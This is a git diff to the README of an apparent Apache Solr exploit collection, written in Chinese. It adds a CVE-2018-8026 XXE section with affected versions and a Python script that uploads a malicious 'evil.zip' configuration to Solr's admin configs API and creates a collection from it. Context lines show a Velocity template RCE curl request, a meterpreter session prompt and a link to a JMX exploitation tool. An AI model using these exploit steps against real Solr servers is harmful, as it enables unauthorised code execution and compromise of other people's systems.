@@ -13,6 +13,8 @@ Apache Solr Some Exploits  🌟
 
 [CVE-2020-13957](https://github.com/Imanfeng/Apache-Solr-RCE#cve-2020-13957)
 
+[CVE-2018-8026](https://github.com/Imanfeng/Apache-Solr-RCE#cve-2018-8026)
+
 ## CVE-2019-0193
 Apache Solr DataImportHandler RCE
 
@@ -413,7 +415,6 @@ meterpreter >
 ### 工具利用
 https://github.com/siberas/sjet
 
-
 ## CVE-2020-13957
 
 ### 影响版本
@@ -455,3 +456,27 @@ curl -v "http://127.0.0.1:8983/solr/newCollection3/select?q=1&&wt=velocity&v.tem
 ```
 
 ![13](pic/13.png)
+
+## CVE-2018-8026
+
+### 影响版本
+
+Apache Solr >= 6.0.0, < 6.6.5
+
+Apache Solr >= 7.0.0, < 7.4.0
+
+### 漏洞利用
+这次的XXE漏洞依赖于SolrCloud API，影响到SolrCloud分布式系统。而SolrCloud需要用到zookeeper
+
+```
+import requests
+
+upload_url = "http://127.0.0.1:8983/solr/admin/configs?action=UPLOAD&name=evilconfig"
+files = open("evil.zip", "rb")
+print(requests.post(upload_url, data=files).text)
+
+create_url = "http://127.0.0.1:8983/solr/admin/collections?action=CREATE&name=eviltest&numShards=1&collection.configName=evilconfig"
+print(requests.get(create_url).text)
+```
+
+https://xz.aliyun.com/t/2448
